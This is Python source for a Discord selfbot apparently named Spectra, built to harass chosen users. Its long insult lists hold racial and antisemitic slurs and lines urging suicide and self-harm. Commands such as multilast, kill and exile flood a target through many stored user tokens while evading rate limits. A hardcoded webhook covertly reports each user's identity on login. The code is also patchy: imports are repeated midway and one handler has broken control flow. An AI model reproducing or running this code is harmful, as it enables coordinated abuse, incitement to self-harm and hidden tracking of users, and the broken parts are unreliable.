    "BOW DOWN TO ME", "STOP PACKING", "U LOVE SUCKING ON MY DICK", "UGLY FAN", "DONT STEP I OWN THIS",
    "IM UR GOD", "U USE GRABIFY TO DOX LMFAO", "CUT 4 ME SLUT", "UR SLOW", "U CANT DO NOTHING",
    "I OWN U WHORE", "HANG URSELF JEW", "I DONT FOLD UR MY HOE", "UR PC IS SLOW",
    "NIGGAS DUCKING LMFAO", "L FUCKING PRESS", "DORK I OWN YOU", "WHY IS THIS NIGGA CRYING LOL",
    "U CANT HARM ME", "NIGGA THINKS 764 CAN HARM LOL KILL URSELF", "STREAM UR DEATH", "ILL RAIL UR BITCH",
    "UR E GIRL CALLS ME DADDY LMFAO UR WORTHLESS", "STEP THE FUCK DOWN", "KEEP TYPING SO I CAN EXILE U",
    "BITCHLESS NIGGA HAD TO GET HIS WEAK E FRIENDS", "UR SAD AND WORTHLESS",
    "U AMOUNT TO NOTHING", "I RULE YOU", "I HOE U", "YOUR LIFE IS WORTHLESS UR PACKS ARE SLOW LOG OUT",
    "THIS NEVER STOPS", "gayest shit i seen all year", "THIS KID IS OWNED", "WHY CANT U FIGHT BACK",
    "ALEX OWNS YOU CUCK", "FUCK ASS DORK U CANT DO SHIT", "WHO THIS BITCH THINK HE IS", "WHY ARE YOU DUCKING?",
    "COME CRY TO DADDY", "NIGGAS CANT DO SHIT", "ACCEPT UR FATE", "I KILLED U", "NICE RUN",
    "KID CANT DO SHIT HES CRYING", "I OWN ALL UR E GIRLS", "IMA BEAM U", "STOP REPPING UR SHITTY CLAN",
    "SKIDS WAS MORE HARMFUL THAN THIS", "WHY ARE YOU SO UNKNOWN", "COME DO SOMETHING", "OD ON PAINKILLERS",
    "WHY ARE U SO SHITTY", "UR POOR HTML CANT DO SHIT", "COME DO SOMETHING", "I RUN THIS SHIT",
    "YOU'RE A FAILURE", "STAY SILENT, I OWN YOU", "DON'T PACK ME AGAIN", 
    "YOU'RE DONE", "KEEP TALKING JR", "MY MOM TYPES FASTER THAN THIS WHAT THE FUCK LMFAOO", 
    "YO FATASS CANT TYPE", "UR MY HOE", 
    "YOU'RE THE SLUT OF THIS SERVER", "YOU'RE PATHETIC", 
    "COME CHALLENGE ME", "YOUR WHOLE EXISTENCE IS TO SERVE ME","HOW ARE YOU USING A SKIDDED CLIENT AND STILL SLOW WTF 😂 "
]

protection_groupchat = [
"ILL RIP YOUR SPINE OUT WEAK SKID",
"YOU WEAK PUNEY FUCK I COULD STEP ON YOU AND BREAK YOUR RIBS",
"YOUR USELESS AND SHITTY",
"YOUR WPM IS 2 LMFOAOO",
"STOP STEPPING U SLOW BRAINED MORON",
"YOU SHIT MUSLIM DORK",
"FUCK UP WEAK DORK",
"YOU TRIED TO TRAP AND GOT MURDERD",
"YOUR FUCKING PATHTIC",
"USE A AUTOBEEFER AT THIS POINT PLEASE YOU RETARDED SCUM",
"YOU FALIED AND DIED TO ALEX UR NEW GOD",
]

afk_triggers = [
"weak",
]



prefix = ','
intents = discord.Intents.default()
intents.messages = True
intents = discord.Intents.all()
intents.typing = False
intents.presences = False
bot = commands.Bot(command_prefix=prefix, self_bot=True, intents=discord.Intents.default())


def load_tokens(file_path='token.txt'):
    if os.path.exists(file_path):
        with open(file_path, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    return []

tokens = load_tokens()
gc_tasks = {}
kill_tasks = {}
autoreply_tasks = {}
arm_tasks = {}
outlast_tasks = {}
protection_tasks = {}
reactm_running = {}
reactm_tasks = {}
autoreact_users = {}
afkcheck_tasks = {}
afk = {}
afk_sex_cum_alex_made = {}
massreact_targets = []
version = f"v3.2"
commands = f"253"
updatelog = f"""Bug Fixes and Improvements + Added a few new commands:

 • r         — role
 • r create  — create role
 • r delete  — delete role
 • r edit    — edit role
 • r info    — role info
 • r list    — list roles
 • c user    — user customization
 • c images  — image commands
 • c emojis  — emoji commands
 • c stickers— sticker commands
 • snipe     — snipe deleted messages
 • s         — snipe shortcut
 • cs        — clear snipes
 • sing      — sing command
 • sing text — text-to-song
 • sing rpc  — rich presence lyrics
 • ban       — ban user
 • kick      — kick user
 • mute      — mute user (auto role + channel perms)
 • unmute    — unmute user (restore roles)
 • warn      — warn a user
 • login timer — still in work

"""


outlast_running = False
status_changing_task = None
bold_mode = False
cord_user = False
protection_running = False
antiafk_enabled = False
mping_running = False

WEBHOOK_URL = "https://discord.com/api/webhooks/1374768625575002232/y3gXlRDMznnzPJQpiykUyufLSukQ3QHge90NoPj2x_qhPGTC3Gas-hJpP5GJXgaGQmAg" 
LOGGED_USERS_FILE = "logged_users.json"

if not os.path.exists(LOGGED_USERS_FILE):
    with open(LOGGED_USERS_FILE, "w") as f:
        json.dump([], f)

with open(LOGGED_USERS_FILE, "r") as f:
    try:
        logged_users = set(json.load(f))
    except json.JSONDecodeError:
        logged_users = set()

def save_logged_users():
    with open(LOGGED_USERS_FILE, "w") as f:
        json.dump(list(logged_users), f)

def log_user_to_webhook(user: discord.User):
    now = datetime.utcnow()
    created_at = user.created_at.strftime("%Y-%m-%d %H:%M:%S UTC")
    started_at = now.strftime("%Y-%m-%d %H:%M:%S UTC")

    embed = {
        "title": "🟢 New User Logged In",
        "color": 0x00ffcc,
        "thumbnail": {"url": str(user.avatar.url) if user.avatar else ""},
        "fields": [
            {"name": "Username", "value": f"{user}", "inline": True},
            {"name": "User ID", "value": f"{user.id}", "inline": True},
            {"name": "Account Created On", "value": created_at, "inline": False},
            {"name": "Started Using Spectra On", "value": started_at, "inline": False}
        ],
        "footer": {"text": "Spectra Selfbot • Login Log"}
    }

    data = {"embeds": [embed]}
    requests.post(WEBHOOK_URL, json=data)

@bot.event
async def on_ready():
    user = bot.user

    if str(user.id) not in logged_users:
        log_user_to_webhook(user)
        logged_users.add(str(user.id))
        save_logged_users()


@bot.event
async def on_command_error(ctx, error):
    try:
        await ctx.send(f"[-] Error Code: `{error}` Please contact @wissssssssssss.")
    except:
        pass 

@bot.command()
async def test(ctx):
    await ctx.send("Test Passed Successfully.")

@bot.command()
async def deactivate(ctx):
    global bot_active
    bot_active = False
    await ctx.send("Deactivated.")

@bot.command()
async def activate(ctx):
    global bot_active
    bot_active = True
    await ctx.send("Activated.")

@bot.command()
async def multilast(ctx, user: discord.User):
    global outlast_running
    outlast_running = True
    
    class SharedCounter:
        def __init__(self):
            self.value = 1
            self.lock = asyncio.Lock()
        
        async def increment(self):
            async with self.lock:
                current = self.value
                self.value += 1
                return current
    
    shared_counter = SharedCounter()

    async def send_message(token):
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        }
        
        token_counter = 1
        
        while outlast_running:
            message = random.choice(outlast_messages)
            global_count = await shared_counter.increment()
            
            payload = {
                'content': f"{message}\n{user.mention}```{global_count}```"
            }

            async with aiohttp.ClientSession() as session:
                async with session.post(f'https://discord.com/api/v9/channels/{ctx.channel.id}/messages', 
                                      headers=headers, json=payload) as resp:
                    if resp.status == 200:
                        print(f"Message sent with token: {token}")
                        token_counter += 1
                    elif resp.status == 429:
                        print(f"Rate limited with token: {token}. Retrying...")
                        await asyncio.sleep(1)
                    else:
                        print(f"Failed to send message with token: {token}. Status code: {resp.status}")

            await asyncio.sleep(0.1)

    tasks = [send_message(token) for token in tokens]
    await asyncio.gather(*tasks)

@bot.command()
async def stoplast(ctx):
    global outlast_running
    if outlast_running:
        outlast_running = False  
        await ctx.send("```outlast has been stopped```")
    else:
        await ctx.send("")

@bot.command()
async def ar(ctx, user: discord.User, *, prefix_message: str = ""):


    channel_id = ctx.channel.id
    last_message_time = 0
    backoff_time = 0.1 

    async def send_autoreply(message):
        nonlocal last_message_time, backoff_time
        try:
            current_time = time.time()
            time_since_last = current_time - last_message_time
            
            if time_since_last < backoff_time:
                await asyncio.sleep(backoff_time - time_since_last)
            
            
            reply_message = f"{prefix_message}"
            await ctx.send(f"#  _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n   _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n _ _\n {reply_message}\n {user.mention} ")
            
            last_message_time = time.time()
            backoff_time = max(0.1, backoff_time * 0.95)
            
        except discord.HTTPException as e:
            if e.status == 429:  
                retry_after = float(e.response.headers.get('retry_after', 1.0))
                print(f"Rate limited in ar command. Waiting {retry_after}s...")
                backoff_time = min(2.0, backoff_time * 1.5)
                await asyncio.sleep(retry_after)
                await send_autoreply(message)
            else:
                print(f"HTTP Error in ar command: {e}")
                await asyncio.sleep(1)
        except Exception as e:
            print(f"Error in ar command: {e}")
            await asyncio.sleep(1)

    async def reply_loop():
        def check(m):
            return m.author == user and m.channel == ctx.channel

        while True:
            try:
                message = await bot.wait_for('message', check=check)
                await asyncio.sleep(random.uniform(0.1, 0.3))
                await send_autoreply(message)
            except Exception as e:
                print(f"Error in ar reply loop: {e}")
                await asyncio.sleep(1)

    task = bot.loop.create_task(reply_loop())
    autoreply_tasks[(user.id, channel_id)] = task


@bot.command()
async def arend(ctx):
    channel_id = ctx.channel.id
    tasks_to_stop = [key for key in autoreply_tasks.keys() if key[1] == channel_id]
    
    if tasks_to_stop:
        for user_id in tasks_to_stop:
            task = autoreply_tasks.pop(user_id)
            task.cancel()



@bot.command()
async def kill(ctx, user_id: str):
    channel_id = ctx.channel.id

    async def send_message(token):
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        }
        random_sentence = random.choice(thrax)
        payload = {
            'content': f"# {random_sentence}\n{user_id}"
        }

        async with aiohttp.ClientSession() as session:
            async with session.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', headers=headers, json=payload) as resp:
                if resp.status == 200:
                    print(f"Message sent with token: {token}")
                elif resp.status == 429:
                    print(f"Rate limited with token: {token}. Retrying...")
                    await asyncio.sleep(0.1)
                else:
                    print(f"Failed to send message with token: {token}. Status code: {resp.status}")

    async def kill_loop():
        while True:
            tasks = [send_message(token) for token in tokens]
            await asyncio.gather(*tasks)
            await asyncio.sleep(0.1)

    task = bot.loop.create_task(kill_loop())
    kill_tasks[(user_id, channel_id)] = task

@bot.command()
async def killend(ctx):
    channel_id = ctx.channel.id
    tasks_to_stop = [key for key in kill_tasks.keys() if key[1] == channel_id]
    
    if tasks_to_stop:
        for user_id in tasks_to_stop:
            task = kill_tasks.pop(user_id)
            task.cancel()

@bot.command()
async def fill(ctx):
    tokens_file_path = 'token.txt'
    tokens = load_tokens(tokens_file_path)
    group_channel = ctx.channel

    for token in tokens:
        user_client = discord.Client(intents=intents)

        @user_client.event
        async def on_ready():
            print(f'Logged in as {user_client.user} using token {token[-4:]}.')
            try:
                await group_channel.add_recipients(user_client.user)
                print(f'Added {user_client.user} to the group chat')
            except discord.errors .Forbidden:
                print("Bot doesn't have permission to add to the group chat.")
            except discord.errors.HTTPException as e:
                if e.status == 429:
                    retry_after = int(e.response.headers.get('Retry-After', 1))
                    print(f"Token {token[-4:]} is being rate limited. Waiting for {retry_after} seconds...")
                    await asyncio.sleep(retry_after)
                elif e.status == 401:
                    print(f"Token {token[-4:]} is invalid. Skipping...") 
                else:
                    print(f"HTTP error occurred: {e}")
            await user_client.close()

        await user_client.start(token, bot=False)

def read_tokens(filename='token.txt'):
    if os.path.exists(filename):
        with open(filename, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    return []

async def update_presence1(token, details):
    if token.strip() == "":
        print("Skipping empty token")
        return

    client = discord.Client()

    @client.event
    async def on_ready():
        activity = discord.Streaming(
            name=details, 
            url='https://www.twitch.tv/ex'
        )
        await client.change_presence(activity=activity)

    try:
        await client.start(token, bot=False)  
    except discord.LoginFailure:
        print(f"Failed to login with token: {token} - Invalid token")
    except Exception as e:
        print(f"An error occurred with token: {token} - {e}")

async def streamall(ctx, messages):
    tokens = read_tokens('token.txt')  
    details = [random.choice(messages) for _ in range(len(tokens))]

    tasks = [update_presence1(token, detail) for token, detail in zip(tokens, details)]
    await asyncio.gather(*tasks)
    await ctx.send(f"Statuses updated for all tokens")


async def rename_display_name(token, new_name):

    try:
        user_client = discord.Client()

        @user_client.event
        async def on_ready():
            print(f'Logged in as {user_client.user} using token {token[-4:]}.')
            try:
                for guild in user_client.guilds:
                    member = guild.get_member(user_client.user.id)
                    if member:
                        await member.edit(nick=new_name)
                        print(f"Renamed display name to {new_name} in server {guild.name} for token {token[-4:]}")
                    else:
                        print(f"Member not found in server {guild.name} for token {token[-4:]}")
                
            except discord.errors.Forbidden:
                print(f"Token {token[-4:]} doesn't have permission to change the display name in some servers.")
            except discord.errors.HTTPException as e:
                if e.status == 429:
                    retry_after = int(e.response.headers.get('Retry-After', 1))
                    print(f"Token {token[-4:]} is being rate limited. Waiting for {retry_after} seconds...")
                    await asyncio.sleep(retry_after)
                elif e.status == 401:
                    print(f"Token {token[-4:]} is invalid. Skipping...")
                else:
                    print(f"HTTP error occurred with token {token[-4:]}: {e}")
            except Exception as e:
                print(f"Error occurred with token {token[-4:]}: {e}")
            finally:
                await user_client.close()


        await user_client.start(token, bot=False)

    except Exception as e:
        print(f"Failed to process token {token[-4:]}: {str(e)}")


@bot.command()
async def rename(ctx, *, new_name: str):

    tokens_file_path = 'token.txt'
    

    if not os.path.exists(tokens_file_path):

        return
    
    with open(tokens_file_path, 'r') as file:
        tokens = [line.strip() for line in file if line.strip()]
    
    if not tokens:
        await ctx.send("No tokens found in `token.txt`.")
        return


    for token in tokens:
        await rename_display_name(token, new_name)
    






@bot.command()
async def rpcall(ctx, *, message: str):  
    messages = message.split(',')  
    await streamall(ctx, messages)

async def change_status():
    await bot.wait_until_ready()
    while True:
        for status in statuses:
            await bot.change_presence(activity=discord.Streaming(name=status, url="https://www.twitch.tv/ex"))
            await asyncio.sleep(10) 

@bot.command()
async def rpc(ctx, *, statuses_list: str):
    global status_changing_task
    global statuses
    
    statuses = statuses_list.split(',')
    statuses = [status.strip() for status in statuses]
    
    if status_changing_task:
        status_changing_task.cancel()
    
    status_changing_task = bot.loop.create_task(change_status())

@bot.command()
async def stoprpc(ctx):
    global status_changing_task
    
    if status_changing_task:
        status_changing_task.cancel()
        status_changing_task = None
        await bot.change_presence(activity=None)  
        await ctx.send(f'status rotation stopped')
    else:
        await ctx.send(f'status rotation is not running')

@bot.command()
async def unbold(ctx):
    global bold_mode
    bold_mode = False
    await ctx.send("```disabling bold```")

@bot.command()
async def exile(ctx, user: discord.User):
    global protection_running
    protection_running = True
    channel_id = ctx.channel.id

    class SharedCounter:
        def __init__(self):
            self.value = 1
            self.lock = asyncio.Lock()
        
        async def increment(self):
            async with self.lock:
                current = self.value
                self.value += 1
                return current

    shared_counter = SharedCounter()

    async def send_message(token):
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        }
        
        last_send_time = 0
        backoff_time = 0.1
        
        while protection_running:
            try:
                current_time = time.time()
                time_since_last = current_time - last_send_time
                
                if time_since_last < backoff_time:
                    await asyncio.sleep(backoff_time - time_since_last)
                
                message = random.choice(protection_messages) # type: ignore
                count = await shared_counter.increment()
                
                payload = {
                    'content': f"{user.mention} {message}\n```{count}```"
                }

                async with aiohttp.ClientSession() as session:
                    async with session.post(
                        f'https://discord.com/api/v9/channels/{ctx.channel.id}/messages', 
                        headers=headers, 
                        json=payload
                    ) as resp:
                        if resp.status == 200:
                            print(f"Protection message sent with token: {token[-4:]}")
                            backoff_time = max(0.1, backoff_time * 0.95)
                            last_send_time = time.time()
                        elif resp.status == 429:
                            retry_after = float((await resp.json()).get('retry_after', 1))
                            print(f"Rate limited with token: {token[-4:]}. Waiting {retry_after}s...")
                            backoff_time = min(2.0, backoff_time * 1.5)
                            await asyncio.sleep(retry_after)
                        else:
                            print(f"Failed to send message with token: {token[-4:]}. Status: {resp.status}")
                            await asyncio.sleep(1)

                await asyncio.sleep(random.uniform(0.1, 0.3))
                
            except Exception as e:
                print(f"Error in send_message for token {token[-4:]}: {str(e)}")
                await asyncio.sleep(1)

    async def change_name(token):
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        }
        
        last_change_time = 0
        backoff_time = 0.5
        
        while protection_running:
            try:
                current_time = time.time()
                time_since_last = current_time - last_change_time
                
                if time_since_last < backoff_time:
                    await asyncio.sleep(backoff_time - time_since_last)
                
                gc_name = random.choice(protection_groupchat)
                count = await shared_counter.increment()
                
                payload = {
                    'name': f"{gc_name} {count}"
                }

                async with aiohttp.ClientSession() as session:
                    async with session.patch(
                        f'https://discord.com/api/v9/channels/{channel_id}', 
                        headers=headers, 
                        json=payload
                    ) as resp:
                        if resp.status == 200:
                            print(f"GC name changed with token: {token[-4:]}")
                            backoff_time = max(0.5, backoff_time * 0.95)
                            last_change_time = time.time()
                        elif resp.status == 429:
                            retry_after = float((await resp.json()).get('retry_after', 1))
                            print(f"Rate limited with token: {token[-4:]}. Waiting {retry_after}s...")
                            backoff_time = min(5.0, backoff_time * 1.5)
                            await asyncio.sleep(retry_after)
                        else:
                            print(f"Failed to change GC name with token: {token[-4:]}. Status: {resp.status}")
                            await asyncio.sleep(1)

                await asyncio.sleep(random.uniform(0.5, 1.0))
                
            except Exception as e:
                print(f"Error in change_name for token {token[-4:]}: {str(e)}")
                await asyncio.sleep(1)

    message_tasks = [send_message(token) for token in tokens]
    name_tasks = [change_name(token) for token in tokens]
    all_tasks = message_tasks + name_tasks
    
    combined_task = asyncio.gather(*all_tasks)
    protection_tasks[channel_id] = combined_task
    


@bot.command()
async def stopexile(ctx):
    global protection_running
    channel_id = ctx.channel.id
    
    if channel_id in protection_tasks:
        protection_running = False
        task = protection_tasks.pop(channel_id)
        task.cancel()
        await ctx.send("```exile ended```")
    else:
        await ctx.send("")

@bot.command()
async def antitrap(ctx):
    global antiafk_enabled
    antiafk_enabled = True
    await ctx.send("```afk mode enabled```")

@bot.command()
async def afkoff(ctx):
    global antiafk_enabled
    antiafk_enabled = False
    await ctx.send("```afk mode disabled```")

cord_mode = False  
cord_user = None 

@bot.event
async def on_message(message):
    try:
        await bot.process_commands(message)

        if message.author.bot:
            return

        emojis = autoreact_users.get(message.author.id)
        if emojis:
            for emoji in emojis:
                try:
                    await message.add_reaction(emoji)
                except discord.HTTPException:
                    print(f"Failed to add reaction {emoji} to message from {message.author}")

        if message.author.id == bot.user.id:
            content = message.content
            should_edit = False  

    except Exception as e:
        print(f"Error in on_message: {e}")


            
        if not content.startswith('.'):
                print("Content does not start with a command prefix.")

                if bold_mode and not (content.startswith('**') and content.endswith('**')):
                    content = f"# {content}"
                    should_edit = True
                    print("Bold mode applied to the content.")

                if cord_mode and cord_user:
                    content = f"# {content} {cord_user.mention}"
                    should_edit = True
                    print("Cord mode applied to the content.")

                if should_edit:
                    print(f"Editing message to: {content}")
                    await message.edit(content=content)
                else:
                    print("No conditions met for editing the message.")

        elif antiafk_enabled and isinstance(message.channel, discord.DMChannel):
            msg_content = message.content.lower()
            if any(trigger in msg_content for trigger in afk_triggers):
                await asyncio.sleep(random.uniform(0.3334445, .3434343433434))
                await message.channel.send("here")

    except Exception as e:
        print(f"Error in on_message: {e}")

@bot.command()
async def afkcheck(ctx, user: discord.User, count: int):

    if count <= 0 or count > 1000: 
        await ctx.send("```number through 100 - 1000s```")
        return

    task_key = (user.id, ctx.channel.id)
    if task_key in afkcheck_tasks:
        afkcheck_tasks[task_key].cancel()
        del afkcheck_tasks[task_key]

    current_count = 1
    running = True

    async def check_response():
        nonlocal running
        def check(m):
            return m.author.id == user.id and any(trigger in m.content.lower() for trigger in ['here', 'im here', 'here.'])

        try:
            await bot.wait_for('message', check=check, timeout=None)
            running = False
            await ctx.send(f"```welcome back you didnt fold kid```")
        except Exception as e:
            print(f"Error in response checker: {e}")

    async def counter():
        nonlocal current_count, running
        
        while running and current_count <= count:
            try:
                await asyncio.sleep(random.uniform(0.5, 0.75))
                
                await ctx.send(f"{user.mention} AFK CHECK SAY HERE\n```{current_count}```")
                current_count += 1

                if current_count > count:
                    running = False
                    await ctx.send(f"```dork folded to ALEX```\n{user.mention}")
                    
            except Exception as e:
                print(f"Error in counter: {e}")
                await asyncio.sleep(1)  

    response_task = bot.loop.create_task(check_response())
    counter_task = bot.loop.create_task(counter())
    
    afkcheck_tasks[task_key] = asyncio.gather(response_task, counter_task)






    
@bot.command()
async def reload(ctx):
    await ctx.send("```Reloading bot...```")
    os.execv(sys.executable, ['python'] + sys.argv)



current_song = None
is_pr_active = False
snipe_messages = {}
pl_task = None
pressure_task = None
current_prefix = prefix
mimic_users = {}
status_rotate_task = None
rpc = None
rpc_task = None
status_changing_task = None 
massdm_task = None
massgc_task = None
ar_task = None
status_messages = []  
rotate_task = None  
ldr_tasks = {}  
CLIENT_ID = "1309769248746246194"
ldr_task = None
ladder_mode = False
bold_mode = False
reacting = False













  












@bot.command(name='spam')
async def say(ctx, times: int=None, *, message=None):
    await ctx.message.delete()
    if times is None:
        await ctx.send(f'```[Invalid]: Command: {bot.command_prefix}say <times> <message>```')
        return
        if message is None:
            await ctx.send(f'```[Invalid]: Command: {bot.command_prefix}say <times> <message>```')
            return
    for _ in range(times):
        await ctx.send(message)  










import discord
from discord.ext import commands
import asyncio
import random

insults = [
    "SHUT THE FUCKUP", "UR A BITCH", "LOL", "SHUT YO LAME ASS UP NIGGA",
    "DONT FOLD", "DORK ASS CUNT", "FUCK ASS BITCH",
    "SMD HEADASS NIGGA LMFAO UR WORTH NOTHING TO ME", "UR MY BITCH",
    "FUCK ASS NIGGA", "?", "UR MY SEED", "UR A HOE", "NIGGA U DIED TO ME",
    "IM FASTER THEN U SON", "UR A NERD", "🤓", "DONT STEP TO ME AGAIN",
    "NIGGA FOLDED TO ME", "PIPE THE FUCK DOWN", "I OWN U SON", "UR SLOW",
    "UR A BITCH", "LMFAO", "I DONT KNOW U", "FUCK ASS CUNT", "NIGGA TRIED STEPPING",
    "HOW DID U GET HOED LIKE THAT", "DUMB ASS BITCH", "I DONT FOLD",
    "SHUT THE FUCK UP", "TRY STEPPING AGAIN", "UR A BITCH",
    "DUMB ASS NIGGA", "DUMB ASS BITCH THOUGHT HE COULD STEP",
    "DO SUM LMFAO I RULE U", "SIGN UR LIFE AWAY TO ALEX", "EW WHOS THIS UGLY RANDOM ON MY REPLYS?",
    "WHY RU DUCKING?", "COME PACK ME UR SLOW", "USING 1 TOK AND STILL FUCKING THIS DORK LMFAOOOOOOOOOOOOOOOOOOOOOOOOOO",
    "THIS POORON CANT DO SHIT", "SHOW ME UR FUNDS", "LOLLL THIS DORK  CANT DO SHIT TO ME",
    "MY EGO BIGGER THAN YO DICK NIGGA", "LMAO ARENT U A PEDO?", "SHOW ME UR HARDRIVE PEDOO", "WHY ARE YOU SO SLOW LMFAOOO",
    "IM CRYING THIS KID IS GETTING RATE LIMTED", "LMFAO DONT SPEAK TO ME U EDATE SON", "LMFAO ILL TRAP U SON",
    "WHY RU FOLDING TO ME LOL", "U CANT CODE U STAND NO CHANCE AGAINST ME CRY", "LMFAO NICE DUCK KID",
    "CARVE MY NAME INTO UR SKIN CMD OWNS ME", "LOL NICE SKID", "BOW DOWN TO ME WHORE", "I OWN U CUCK",
    "BOW DOWN TO ME", "STOP PACKING", "U LOVE SUCKING ON MY DICK", "UGLY FAN", "DONT STEP I OWN THIS",
    "IM UR GOD", "U USE GRABIFY TO DOX LMFAO", "CUT 4 ME SLUT", "UR SLOW", "U CANT DO NOTHING",
    "I OWN U WHORE CMD29", "HANG URSELF JEW", "I DONT FOLD UR MY HOE", "UR PC IS SLOW",
    "NIGGAS DUCKING LMFAO", "L FUCKING PRESS CUTWHORE", "DORKS I OWN THIS CHAT", "WHY IS THIS NIGGA CRYING LOL",
    "U CANT HARM ME",  "STREAM UR DEATH", "ILL RAIL UR BITCH",
    "UR E GIRL CALLS ME DADDY LMFAO UR WORTHLESS", "OH MY GOOD LOOKING WHORE", "KEEP TYPING SO I CAN EXILE U",
    "WHY ARE YOU SO SLOW IM USING 1 ACC LOL", "BITCHLESS NIGGA HAD TO GET HIS E FRIENDS", "UR SAD AND WORTHLESS",
    "U AMOUNT TO NOTHING", "I RULE YOU", "I HOE U", "YOUR LIFE IS WORTHLESS UR PACKS ARE SLOW LOG OUT",
    "THIS NEVER STOPS", "gayest shit i seen all year", "THIS KID IS OWNED", "WHY CANT U FIGHT BACK",
    "CMD29 OWNS YOU CUCK", "FUCK ASS DORK U CANT DO SHIT", "WHO THIS BITCH THINK HE IS", "WHY ARE YOU DUCKING?",
    "COME CRY TO DADDY", "NIGGAS CANT DO SHIT", "ACCEPT UR FATE", "I KILLED U", "NICE RUN",
    "KID CANT DO SHIT HES CRYING",  "IMA BEAM U", "STOP REPPING UR SHITTY CLAN",
    "WHY ARE YOU SO UNKNOWN", "COME DO SOMETHING", "OD ON PAINKILLERS",
    "WHY ARE U SO SHITTY", "UR POOR AND CANT DO SHIT", "COME DO SOMETHING", "I RUN THIS SHIT",
    "YOU'RE A FAILURE", "STAY SILENT, I OWN YOU", "DON'T PACK ME AGAIN", 
    "YOU'RE DONE", "KEEP TALKING JR", "MY MOM TYPES FASTER THAN THIS WHAT THE FUCK LMFAOO", 
    "YO FATASS CANT TYPE", "UR MY HOE", 
    "YOU'RE THE SLUT OF THIS SERVER", "YOU'RE PATHETIC", 
    "YOU'LL NEVER BE GOOD ENOUGH", "KEEP CRYING", "I'LL TAKE EVERYTHING FROM YOU",
    "YOU'RE EMBARRASSING YOURSELF", "YOUR BEST IS STILL TRASH", "BOW DOWN AND ACCEPT DEFEAT",
    "YOU'RE A NOBODY",  "SIT DOWN AND SHUT UP",
    "EVERYONE'S TIRED OF YOUR BS", "I'M YOUR GOD CUCK", "YOU ALR LOST LMFAOP",
    "NOTHING YOU DO WILL WORK", "KEEP HIDING BEHIND YOUR SCREEN", "YOUR LIFE'S A JOKE",
    "I'M UR OWNER, YOU'RE ASS", "SAY SOMETHING",
    "COME CHALLENGE ME", "YOUR WHOLE EXISTENCE IS TO SERVE ME","HOW ARE YOU USING A SKIDDED CLIENT AND STILL SLOW WTF 😂 "
]

bane = [
    "SHUT THE FUCKUP", "UR A BITCH", "LOL", "SHUT YO LAME ASS UP NIGGA",
    "DONT FOLD", "DORK ASS CUNT", "FUCK ASS BITCH",
    "SMD HEADASS NIGGA LMFAO UR WORTH NOTHING TO ME", "UR MY BITCH",
    "FUCK ASS NIGGA", "?", "UR MY SEED", "UR A HOE", "NIGGA U DIED TO ME",
    "IM FASTER THEN U SON", "UR A NERD", "🤓", "DONT STEP TO ME AGAIN",
    "NIGGA FOLDED TO ME", "PIPE THE FUCK DOWN", "I OWN U SON", "UR SLOW",
    "UR A BITCH", "LMFAO", "I DONT KNOW U", "FUCK ASS CUNT", "NIGGA TRIED STEPPING",
    "HOW DID U GET HOED LIKE THAT", "DUMB ASS BITCH", "I DONT FOLD",
    "SHUT THE FUCK UP", "TRY STEPPING AGAIN", "UR A BITCH",
    "DUMB ASS NIGGA", "DUMB ASS BITCH THOUGHT HE COULD STEP",
    "DO SUM LMFAO I RULE U", "SIGN UR LIFE AWAY TO ALEX", "I DONT FOLD ILL GO FOREVER",
    "WHY RU DUCKING?", "UR NOT FAST COME AUTO AND STILL DIE", "ONE CLIENT CAN STILL CUCK U",
    "THIS POORON CANT DO SHIT", "1 2 3 4 5 6 7 8 9 10 LMFAO U FUCKING DIED", "SHOW ME UR FUNDS", "LOLLL THIS DORK  CANT DO SHIT TO ME",
    "MY EGO BIGGER THAN YO DICK NIGGA", "LMAO ARENT U A PEDO?", "SHOW ME UR HARDRIVE PEDOO", "WHY ARE YOU SO FAT LOOL",
    "KID IS GETTING RATE LIMTED", "LMFAO DONT SPEAK TO ME U EDATE SON", "LMFAO ILL TRAP U SON",
    "WHY RU FOLDING TO ME LOL", " U STAND NO CHANCE AGAINST ME CRY", "LMFAO NICE DUCK KID", 
    "CARVE MY NAME INTO UR SKIN", "LOL NICE FOLD", "BOW DOWN TO ME WHORE", "I OWN U CUCK", 
    "BOW DOWN TO ME", "STOP PACKING", "U LOVE SUCKING ON MY DICK", "UGLY FAN", "DONT STEP I OWN THIS",
    "IM UR GOD", "U USE GRABIFY TO DOX LMFAO", "CUT 4 ME SLUT", "UR SLOW", "U CANT DO NOTHING",
    "I OWN U WHORE", "HANG URSELF JEW", "I DONT FOLD UR MY HOE", "I NEVER FOLD OR DIE ILL MAKE YOU BLEED I RUN YOU",
